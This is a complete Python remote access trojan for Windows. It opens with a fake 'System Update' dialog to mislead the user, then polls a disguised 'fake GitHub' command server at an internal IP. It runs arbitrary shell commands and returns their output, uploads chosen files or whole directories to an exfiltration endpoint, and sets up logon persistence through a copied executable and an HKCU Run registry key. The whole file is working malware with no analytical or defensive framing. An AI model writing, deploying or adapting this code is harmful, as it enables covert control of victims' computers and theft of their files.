#!/usr/bin/env python3
import os
import sys
import time
import requests
import subprocess
import ctypes

# Configuration URLs for your fake GitHub server
FAKE_GITHUB_BASE = "http://10.10.10.2/fake-github"
COMMANDS_URL     = FAKE_GITHUB_BASE + "/Commands.txt"
OUTPUT_URL       = FAKE_GITHUB_BASE + "/Output.txt"
EXFIL_BASE_URL   = FAKE_GITHUB_BASE + "/Exfiltration"

def show_fake_update():
    """Display a fake system update message to the user."""
    message = "Completed Loading new firewall policies"
    title   = "System Update"
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)

def upload_file(filepath, url):
    """Upload a single file to the specified URL using an HTTP PUT request."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        resp = requests.put(url, data=data)
        if resp.status_code in (200, 201):
            print(f"Uploaded {filepath} successfully.")
        else:
            print(f"Failed to upload {filepath}: {resp.status_code}")
    except Exception as e:
        print(f"Error uploading {filepath}: {e}")

def upload_path(path):
    """
    Upload a single file or all files under a directory.
    If 'path' is a file → upload that file.
    If 'path' is a directory → recurse and upload every file inside.
    """
    if os.path.isfile(path):
        filename = os.path.basename(path)
        target_url = f"{EXFIL_BASE_URL}/{filename}"
        upload_file(path, target_url)
    elif os.path.isdir(path):
        for root, _, files in os.walk(path):
            for fname in files:
                full = os.path.join(root, fname)
                target_url = f"{EXFIL_BASE_URL}/{fname}"
                upload_file(full, target_url)
    else:
        print(f"Path does not exist: {path}")

def upload_specific_file(filename):
    """Upload a specific file from the current working directory."""
    filepath = os.path.join(os.getcwd(), filename)
    if not os.path.exists(filepath):
        print(f"File {filepath} does not exist.")
        return
    target_url = f"{EXFIL_BASE_URL}/{filename}"
    upload_file(filepath, target_url)

def get_command():
    """Fetch the command from Commands.txt on your fake GitHub server."""
    try:
        resp = requests.get(COMMANDS_URL)
        if resp.status_code == 200:
            return resp.text.strip()
    except Exception as e:
        print("Error fetching command:", e)
    return ""

def send_output(output):
    """Send the command output back to Output.txt on your fake GitHub server."""
    try:
        resp = requests.put(OUTPUT_URL, data=output)
        if resp.status_code in (200, 201):
            print("Output uploaded successfully.")
        else:
            print("Failed to upload output:", resp.status_code)
    except Exception as e:
        print("Error sending output:", e)

def persist_exe_user():
    """
    Copy this executable to %APPDATA%\\RightPoint\\RightPointV3.exe
    and add a HKCU Run key so it starts on every logon.
    """
    import shutil
    import winreg

    current_exe = os.path.abspath(sys.argv[0])
    appdata     = os.environ.get("APPDATA", r"C:\Users\Public\AppData")
    target_dir  = os.path.join(appdata, "RightPoint")
    target_exe  = os.path.join(target_dir, "RightPointV3.exe")

    try:
        os.makedirs(target_dir, exist_ok=True)
        shutil.copy(current_exe, target_exe)
        print(f"Copied executable to: {target_exe}")
    except Exception as e:
        print(f"Error copying executable: {e}")
        return

    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RightPointV3", 0, winreg.REG_SZ, target_exe)
        winreg.CloseKey(key)
        print("Persistence registry key added.")
    except Exception as e:
        print(f"Error writing registry key: {e}")

def main():
    # Show fake update if not already running as the persisted exe
    if os.path.basename(sys.argv[0]).lower() != "rightpointv3.exe":
        show_fake_update()
        time.sleep(2)
    else:
        print("Persisted version detected; skipping fake update.")

    print("Monitoring for commands…")
    last_command = ""

    while True:
        command = get_command().strip()
        if command and command != last_command:
            print("New command received:", command)
            last_command = command
            cmd_low = command.lower()

            if cmd_low == "persist":
                persist_exe_user()

            elif cmd_low.startswith("upload "):
                # Upload a file from the current working directory
                _, filename = command.split(maxsplit=1)
                upload_specific_file(filename)

            elif cmd_low.startswith("get "):
                # Upload any arbitrary file or directory
                _, path = command.split(maxsplit=1)
                print(f"Uploading path: {path}")
                upload_path(path)

            else:
                # Execute arbitrary command and send back output
                output = subprocess.getoutput(command)
                print("Command output:\n", output)
                send_output(output)

        time.sleep(5)

if __name__ == "__main__":
    main()
